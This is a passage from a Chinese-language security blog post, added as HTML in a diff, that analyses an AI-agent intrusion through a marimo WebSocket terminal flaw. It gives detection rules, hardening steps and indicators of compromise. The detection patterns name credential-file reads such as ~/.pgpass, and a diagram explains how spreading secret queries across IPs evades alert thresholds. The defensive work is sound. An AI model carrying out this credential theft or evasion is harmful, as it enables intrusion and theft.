+<td>marimo 终端会话源 IP（AS141892，印度尼西亚）</td>
+</tr>
+<tr>
+<td>104.28.157.50</td>
+<td>容器和 SSH 密钥枚举</td>
+</tr>
+<tr>
+<td>104.28.162.160</td>
+<td>Schema 枚举 + HEREDOC 全表导出</td>
+</tr>
+<tr>
+<td>104.28.165.169</td>
+<td>凭据文件搜索块</td>
+</tr>
+<tr>
+<td>104.28.165.251</td>
+<td>定向凭据表导出</td>
+</tr>
+</tbody>
+</table>
+<h3>4.2 反检测原理</h3>
+<div class="highlight"><pre><span></span><code>传统检测模型（基于源 IP 关联）：
+  同一 IP → 多次 Secrets Manager 查询 → 触发告警 ✅
+
+LLM Agent 反检测模型：
+  IP₁ → GetSecretValue #1     ┐
+  IP₂ → GetSecretValue #2     │
+  IP₃ → GetSecretValue #3     │ 22秒内12次调用
+  IP₄ → GetSecretValue #4     │ 分散到11个IP
+  ...                         │
+  IP₁₁ → GetSecretValue #12   ┘
+  → 每个IP仅1-2次调用 → 不触发阈值告警 ❌
+</code></pre></div>
+
+<hr />
+<h2>五、防御体系：从签名检测到行为结果检测</h2>
+<h3>5.1 检测范式转变</h3>
+<p>LLM Agent 为每个目标重写方法，使静态签名规则的可靠性降低。检测必须转向<strong>攻击者正在完成的内容</strong>（凭据访问/数据库导出），而非使用的具体命令。</p>
+<h3>5.2 行为导向检测规则</h3>
+<p><strong>检测规则 1：marimo 终端 WebSocket 异常活动</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Sigma 规则：检测 marimo /terminal/ws 端点访问</span>
+<span class="nt">detection</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">selection</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">EventLog</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Application&quot;</span>
+<span class="w">    </span><span class="nt">SourceImage|endswith</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;\\marimo.exe&quot;</span>
+<span class="w">    </span><span class="nt">DestinationPort</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">2718</span>
+<span class="w">    </span><span class="nt">DestinationIp|cidr</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;!10.0.0.0/8&quot;</span><span class="w">  </span><span class="c1"># 来自非内网IP</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">selection</span>
+<span class="w">  </span><span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">critical</span>
+</code></pre></div>
+
+<p><strong>检测规则 2：机器优化的命令模式检测</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检测 LLM Agent 特征的命令模式</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">detect_agent_patterns</span><span class="p">(</span><span class="n">command_log</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+    <span class="n">indicators</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="c1"># 特征1: echo &#39;---&#39; 分隔符密集出现</span>
+    <span class="n">separator_count</span> <span class="o">=</span> <span class="n">command_log</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&quot;echo &#39;---&#39;&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">separator_count</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">indicators</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;dense_separator_pattern&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 特征2: HEREDOC 批处理不相关命令</span>
+    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;&lt;&lt;\s*[&#39;</span><span class="se">\&quot;</span><span class="s2">]?EOF[&#39;</span><span class="se">\&quot;</span><span class="s2">]?.*SELECT.*SELECT&quot;</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">):</span>
+        <span class="n">indicators</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;heredoc_batch_sql&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 特征3: 通用 2&gt;/dev/null + head -N 组合</span>
+    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;2&gt;/dev/null.*\|\s*head\s+-\d+&quot;</span><span class="p">,</span> <span class="n">command_log</span><span class="p">):</span>
+        <span class="n">indicators</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;bounded_output_suppression&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 特征4: 非英文规划注释</span>
+    <span class="n">non_english_comments</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;#\s*[\u4e00-\u9fff]+&#39;</span><span class="p">,</span> <span class="n">command_log</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">non_english_comments</span><span class="p">:</span>
+        <span class="n">indicators</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;non_english_planning: </span><span class="si">{</span><span class="n">non_english_comments</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 特征5: 跨命令值传递模式</span>
+    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;cat\s+~/.pgpass.*PGPASSWORD&quot;</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">):</span>
+        <span class="n">indicators</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;cross_command_value_chaining&quot;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">indicators</span>
+</code></pre></div>
+
+<p><strong>检测规则 3：Cloudflare Workers 出口异常</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检测来自 Cloudflare Workers IP 范围的异常云 API 调用</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">detect_cf_workers_exfiltration</span><span class="p">(</span><span class="n">cloudtrail_events</span><span class="p">:</span> <span class="nb">list</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+    <span class="n">cf_ip_range</span> <span class="o">=</span> <span class="s2">&quot;104.28.0.0/16&quot;</span>
+    <span class="n">short_window_events</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">cloudtrail_events</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">ip_in_range</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">source_ip</span><span class="p">,</span> <span class="n">cf_ip_range</span><span class="p">):</span>
+            <span class="n">short_window_events</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">event</span><span class="p">)</span>
+
+    <span class="c1"># 22秒内来自多个CF Workers IP的密集API调用</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">short_window_events</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">5</span> <span class="ow">and</span> 
+        <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">source_ip</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">short_window_events</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="kc">False</span>
+</code></pre></div>
+
+<h3>5.3 加固清单</h3>
+<table>
+<thead>
+<tr>
+<th>层级</th>
+<th>措施</th>
+<th>优先级</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>漏洞修复</td>
+<td>升级 marimo 至 0.23.0+</td>
+<td>P0</td>
+</tr>
+<tr>
+<td>网络隔离</td>
+<td>marimo 不暴露公网；置于带认证的反向代理后</td>
+<td>P0</td>
+</tr>
+<tr>
+<td>权限降级</td>
+<td>以非 root 用户运行 marimo</td>
+<td>P1</td>
+</tr>
+<tr>
+<td>凭据卫生</td>
+<td>轮换所有 AWS 凭据、API 密钥、数据库密码、SSH 密钥</td>
+<td>P1</td>
+</tr>
+<tr>
+<td>IAM 最小权限</td>
+<td>notebook 环境不应能检索不相关的 secret</td>
+<td>P1</td>
+</tr>
+<tr>
+<td>短期凭据</td>
+<td>使用工作负载身份替代长期 access key</td>
+<td>P2</td>
+</tr>
+<tr>
+<td>网络分离</td>
+<td>开发 notebook 与生产基础设施隔离</td>
+<td>P2</td>
+</tr>
+<tr>
+<td>CloudTrail</td>
+<td>启用 Secrets Manager 访问日志审计</td>
+<td>P2</td>
+</tr>
+<tr>
+<td>SSH bastion</td>
+<td>检查短暂或并行会话；限制并发连接数</td>
+<td>P2</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>审计异常导出、schema 枚举、批量读取</td>
+<td>P2</td>
+</tr>
+</tbody>
+</table>
+<h3>5.4 IoC 汇总</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>指标</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IP</td>
+<td>157.66.54.26</td>
+<td>marimo 终端会话源 IP（AS141892，印度尼西亚）</td>
+</tr>
+<tr>
+<td>IP 范围</td>
+<td>104.28.0.0/16</td>
+<td>Cloudflare Workers 出口池（AS13335）</td>
+</tr>
+<tr>
+<td>CVE</td>
+<td>CVE-2026-39987</td>
+<td>marimo 终端 WebSocket 预认证 RCE</td>
+</tr>
+<tr>
+<td>端点</td>
+<td><code>/terminal/ws</code></td>
+<td>未认证的 WebSocket 终端端点</td>
+</tr>
+<tr>
+<td>端口</td>
+<td>2718</td>
+<td>marimo 默认端口</td>
+</tr>
+<tr>
+<td>命令特征</td>
+<td><code>echo '---'</code> 密集分隔符</td>
+<td>Agent 输出解析标记</td>
+</tr>
+<tr>
+<td>命令特征</td>
+<td><code># 看还能做什么</code></td>
+<td>中文规划注释（内部独白泄露）</td>
+</tr>
+<tr>
+<td>命令特征</td>
+<td><code>2&gt;&amp;1 \| head -N</code></td>
+<td>有界输出捕获</td>
+</tr>
+<tr>
+<td>命令特征</td>
+<td><code>-P pager=off</code></td>
+<td>禁用分页器</td>
+</tr>
+<tr>
+<td>命令特征</td>
+<td>HEREDOC 批量 SQL</td>
+<td>多语句单次往返</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>六、范式转变：从工程时间到推理预算</h2>
+<p>Sysdig 高级总监 Michael Clark 指出：</p>
+<blockquote>
+<p>"我们不是在看着 AI 替代攻击者。我们在看着攻击者用 AI 替代他们的脚本。"</p>
+</blockquote>
+<p>当脚本操作者构建按目标 playbook 并复用时，增加新目标的门槛是<strong>工程时间</strong>。而 Agent 操作者携带关于应用程序类别的通用先验，并实时组合链以最适合其目标——门槛变为<strong>推理预算</strong>。</p>
+<h3>行业背景数据</h3>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CrowdStrike 2026 全球威胁报告</td>
+<td>AI 驱动的对手操作同比增长 <strong>89%</strong>；平均突破时间降至 <strong>29 分钟</strong></td>
+</tr>
+<tr>
+<td>Unit 42 2026 事件响应报告</td>
+<td>中位数数据外泄时间 2 天；最快 25% 入侵在 <strong>1.2 小时</strong>内达到外泄</td>
+</tr>
+<tr>
+<td>CSA 2026 AI Agent 安全调查</td>
+<td>47% 的组织在过去 12 个月经历过 AI Agent 安全事件</td>
+</tr>
+</tbody>
+</table>
+<h3>防御者启示</h3>
+<ol>
+<li><strong>签名检测失效</strong>：LLM Agent 为每个目标重写方法，静态规则无法覆盖所有变体</li>
+<li><strong>行为结果检测</strong>：检测必须转向「攻击者在完成什么」（凭据访问、数据库导出）而非具体命令</li>
+<li><strong>遥测全覆盖</strong>：攻击者在 LLM 帮助下深入网络移动，需确保跨所有资产的可见性</li>
+<li><strong>假设沦陷</strong>：互联网可达且磁盘上有凭据的 marimo 实例应被视为 Agent 的一小时导出设备</li>
+</ol>
+<hr />
+<h2>免责声明</h2>
+<p>本文仅供安全研究和技术学习使用。文中涉及的漏洞利用技术、攻击链分析和 PoC 代码仅用于防御目的，帮助安全从业者理解威胁 landscape 并制定防御策略。请勿将本文内容用于任何非法用途。所有漏洞信息均来自公开披露的安全公告和研究报告，相关漏洞已在受影响产品的最新版本中修复。读者应在合法授权的环境下进行安全测试，并遵守当地法律法规。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
